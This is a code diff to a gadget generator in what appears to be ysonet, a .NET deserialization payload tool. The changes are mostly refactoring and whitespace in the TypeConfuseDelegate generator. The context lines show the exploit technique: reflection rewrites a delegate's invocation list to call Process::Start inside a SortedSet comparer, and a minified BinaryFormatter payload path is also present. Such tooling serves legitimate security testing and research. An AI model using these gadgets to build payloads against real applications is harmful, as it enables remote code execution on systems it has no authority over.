@@ -10,11 +10,6 @@ namespace ysonet.Generators
 {
     public class TypeConfuseDelegateGenerator : GenericGenerator
     {
-        public override string Name()
-        {
-            return "TypeConfuseDelegate";
-        }
-
         public override string Finders()
         {
             return "James Forshaw";
@@ -27,7 +22,7 @@ namespace ysonet.Generators
 
         public override List<string> Labels()
         {
-            return new List<string> { GadgetTypes.NotBridgeNotDerived };
+            return new List<string> { GadgetTags.Independent };
         }
 
 
@@ -38,12 +33,12 @@ namespace ysonet.Generators
 
         public override object Generate(string formatter, InputArgs inputArgs)
         {
-            if(inputArgs.Minify && inputArgs.UseSimpleType && 
+            if (inputArgs.Minify && inputArgs.UseSimpleType &&
                 (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase) || formatter.Equals("LosFormatter", StringComparison.OrdinalIgnoreCase)))
             {
                 // This is to provide even a smaller payload
                 inputArgs.CmdType = CommandArgSplitter.CommandType.JSON;
-                
+
                 string tcd_json_minified = @"[{'Id': 1,
     'Data': {
       '$type': 'SerializationHeaderRecord',
@@ -360,7 +355,7 @@ namespace ysonet.Generators
 }}]";
 
                 MemoryStream ms_bf = AdvancedBinaryFormatterParser.JsonToStream(tcd_json_minified);
-                if(formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
+                if (formatter.Equals("binaryformatter", StringComparison.OrdinalIgnoreCase))
                 {
                     //BinaryFormatter
                     if (inputArgs.Test)
@@ -421,7 +416,7 @@ namespace ysonet.Generators
             {
                 inputArgs.Cmd = cmdFromFile;
             }
-            
+
             Delegate da = new Comparison<string>(String.Compare);
             Comparison<string> d = (Comparison<string>)MulticastDelegate.Combine(da, da);
             IComparer<string> comp = Comparer<string>.Create(d);
@@ -435,7 +430,7 @@ namespace ysonet.Generators
             {
                 set.Add("");
             }
-            
+
             FieldInfo fi = typeof(MulticastDelegate).GetField("_invocationList", BindingFlags.NonPublic | BindingFlags.Instance);
             object[] invoke_list = d.GetInvocationList();
             // Modify the invocation list to add Process::Start(string, string)
@@ -444,7 +439,7 @@ namespace ysonet.Generators
 
             return set;
         }
-        
+
         public static object GetXamlGadget(string xaml_payload)
         {
             Delegate da = new Comparison<string>(String.Compare);
@@ -460,6 +455,6 @@ namespace ysonet.Generators
             fi.SetValue(d, invoke_list);
             return set;
         }
-        
+
     }
 }
